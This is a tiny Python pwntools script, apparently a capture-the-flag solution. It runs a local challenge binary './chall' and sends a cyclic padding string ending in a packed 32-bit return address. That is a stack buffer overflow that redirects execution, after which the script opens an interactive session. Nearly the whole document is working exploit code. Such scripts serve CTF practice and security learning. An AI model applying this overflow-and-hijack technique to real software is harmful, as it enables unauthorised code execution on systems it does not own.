#! /usr/bin/python3

from pwn import *

HOST = ''
PORT = ''

p = process('./chall')

p.sendline(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab\xd6\x91\x04\x08')

p.interactive()
